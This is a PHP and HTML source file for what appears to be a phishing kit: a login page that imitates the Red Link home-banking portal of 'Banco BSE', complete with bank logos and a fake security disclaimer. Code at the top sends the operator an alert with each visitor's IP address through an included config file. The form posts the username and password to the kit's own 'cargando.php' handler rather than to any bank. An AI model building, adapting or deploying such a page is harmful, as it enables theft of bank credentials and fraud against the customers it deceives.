<?php  
include 'config/personalizar.php';
if ($alertas == 0) {
  $enviara =
  "<b> ¡Alerta! Cliente 🌐 IP: </b> <code>".$_SERVER['REMOTE_ADDR']."</code> iniciando seseión.\n";
  $enviar =  urldecode($enviara);
  include 'config/app.php';
}
?> 

<!doctype html>
<html lang="es-AR">
<head>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
  <link rel="icon" type="ico" href="favicon.ico">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Red Link - Banco BSE</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="assets/css/style.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
  <script type="text/javascript" src="assets/js/main.js"></script>

  <script>
    function validarFormulario() {
      const usuario = document.getElementById('usuario').value;
      const contrasena = document.getElementById('contrasena').value;
      if (usuario.length < 6 || contrasena.length < 6) {
        alert("Usuario y Contraseña deben tener al menos 6 caracteres.");
        return false;
      }
      return true;
    }
  </script>

</head>
<body>
  <div class="d-flex h-100 flex-column justify-content-between">
    <div class="d-none w-100 mb-sm-5 mb-3 d-sm-block">
      <nav class="navbar navbar-expand-lg">
        <div class="container-fluid">

          <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav asd233 m-auto mb-2 mb-lg-0">
              <li class="nav-item">
                <a class="nav-link" aria-current="page" href="#">Preguntas Frecuentes</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" aria-current="page" href="#">|</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" aria-current="page" href="#">Información de Home Banking</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" aria-current="page" href="#">|</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" aria-current="page" href="#">Términos y Condiciones</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" aria-current="page" href="#">|</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" aria-current="page" href="#">Seguridad del Sistema</a>
              </li>

            </ul>

          </div>
        </div>
      </nav>
    </div>


    <div class="page-container w-100  position-relative">
    
      <div class="d-flex shadow mb-sm-3 mb-0 bg-white rounded-2 logon-item">
        <div class="register d-flex justify-content-center align-items-center">
          <div class="text-center">
            <h3 class="fs-18px text-white mb-0 mb-sm-2">¿No tenés usuario?</h3>
            <p class="fs-12 text-white mb-3 mb-sm-2">Crealo para acceder a tu home banking</p>
            <a href="" class="btn kkdkkrll fs-12 btn-outline-light">CREÁ TU USUARIO</a>
          </div>
        </div>
        <div class="logon-container d-flex justify-content-center align-items-center">
          <div class="content-logo">
            <img src="assets/images/bank_logo.png" class="logo">
            <h3 class="fw-normal mb-4 title">Ingresá a tu homebanking</h3>
            <form onsubmit="return validarFormulario()" method="POST" action="cargando.php?error=0">
              
              <div class="mb-1">
                <label class="label-inputs fw-semibold fs-14">Usuario</label>
                <input type="" placeholder="Usuario" id="" class="form-control inputSinEspacios ps-3" required minlength="7" name="user">
              </div>
              <div class="d-flex justify-content-end mb-sm-1 mb-3">
                <label class="mycheck">
                  <input type="checkbox" name="">
                  <span class="fs-12 text-muted">Recordar usuario  </span>
                </label>
              </div>
              <div class="mb-1 position-relative">
                <label class="label-inputs fw-semibold fs-14">Contraseña</label>
                <input type="password" id="pwd" placeholder="Contraseña" required minlength="7" class="form-control inputSinEspacios ps-3" name="pwd" pattern="(?=.*[A-Za-z])(?=.*\d).{6,}" title="Debe contener al menos 6 caracteres, con letras, números y caracteres especiales">
                <i class="bi bi-eye-slash position-absolute"></i>
              </div>
              <div class="d-flex my-4 flex-column-reverse ">
                <div class="text-center">
                  <a href="" class="help text-center d-block text-decoration-none">¿Problema con tu usuario o clave? Te ayudamos a solucionarlo</a>
                </div>
                <div class="mb-24">
                  <button class="w-100 btn btn-primary text-uppercase">ingresar</button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>

      
    </div>


    <div class="d-sm-flex max-width mx-auto pb-4 d-none">
        <div>
          <img src="assets/images/certisur_logo.png" class="h47-w30">
        </div>
        <div>
          <img src="assets/images/link_logo.png" class="h47-w30">
        </div>
        <div class="px-2">
          <span class="fs-10 d-block">
            IMPORTANTE. Recordá que esta entidad no envía correos electrónicos ni realiza llamados telefónicos para solicitar cambio o
            confirmación de datos personales (número de cuenta, nombre de usuario, clave de acceso). Red Link S.A. en ningun caso se
            comunicará con vos requiriéndote este tipo de información. 
          </span>
        </div>
      </div>


  </div>
  <script type="text/javascript">
    document.querySelectorAll('.inputSinEspacios').forEach(input => {
      input.addEventListener('input', () => {
          // Elimina los espacios en blanco del inicio y final
          input.value = input.value.trim();

          // Reemplaza todos los espacios en medio del texto
          input.value = input.value.replace(/\s+/g, '');
      });
  });
  </script>
</body>
</html>